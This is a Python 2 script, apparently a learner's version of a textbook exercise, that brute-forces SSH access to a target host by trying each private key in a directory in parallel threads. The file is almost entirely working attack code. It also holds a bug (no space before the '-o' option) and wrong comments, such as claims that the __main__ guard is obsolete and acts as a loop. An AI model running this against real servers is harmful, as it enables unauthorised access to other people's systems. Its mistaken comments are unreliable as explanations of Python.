import pexpect
from pexpect import pxssh
import optparse
import os
from threading import *
maxConnections = 5
connection_lock = BoundedSemaphore(value=maxConnections)
Stop = False
Fails = 0

# It looks like this is bugged. I tested it against my actual Amazon AWS server, which I removed password authentication for
# It seems that all it really does is verify the first sets of characters, if it matches it automatically assumes that it was the proper key
# Attempting to log in using the cracked common key still results in failure


def connect(user, host, keyfile, release):
    global Stop
    global Fails

    try:
        perm_denied = 'Permission denied'
        ssh_newkey = 'Are you sure you want to continue'
        conn_closed = 'Connection closed by remote host'
        opt = '-o PasswordAuthentication=no'
        connStr = 'ssh ' + user + '@' + host + ' -i ' + keyfile + opt
        child = pexpect.spawn(connStr)
        ret = child.expect([pexpect.TIMEOUT, perm_denied, ssh_newkey, conn_closed, '$', '#', ])

        if ret == 2:
            print '[-] Adding host to `/.ssh/known_hosts`'
            child.sendline('yes')
            connect(user, host, keyfile, False)
        elif ret == 3:
            print '[-] Connection Closed By Remote Host'
            Fails += 1
        elif ret > 3:
            print '[+] Success. ' + str(keyfile)
            Stop = True
    finally:
        if release:
            connection_lock.release()

def main():

    ## opt parse section is basically what allows you to specifiy -option commands
    parser = optparse.OptionParser('usage%prog -H ' + '<target host> -u <user> -d <directory>')
    parser.add_option('-H', dest='tgtHost', type='string', help='specify target host')
    parser.add_option('-d', dest='passDir', type='string', help='specify directory with keys')
    parser.add_option('-u', dest='user', type='string', help='specify the user')
    (options, args) = parser.parse_args()

    # assigns easier to use values to the optparse portion
    host = options.tgtHost
    passDir = options.passDir
    user = options.user
    if host == None or passDir == None or user == None: # if user failed to provide any of these three variables
        print parser.usage
        exit(0)
    # Reads the keyfiles stored from the downloads
    for filename in os.listdir(passDir):
        if Stop:
            print '[*] Exiting: Key Found.'
            exit(0)
        if Fails > 5:
            print '[!] Exiting: ' + 'Too Many Connections Closed by Remote Host.'
            print '[!] Adjust number of simultaneous threads.'
            exit(0)
        # Brute Forcer script
        connection_lock.acquire()
        fullpath = os.path.join(passDir, filename) # Basically print working directory
        print '[-] Testing keyfile ' + str(fullpath) # user prompted what keyfile is tested on
        t = Thread(target=connect, args=(user, host, fullpath, True))
        child = t.start()

if __name__ == '__main__': # This is no longer necessary for 2017's Python 2.7.13 and 3.x, it is basically a While-loop
# It says once it reads the name of the function "main", then run main()
    main()
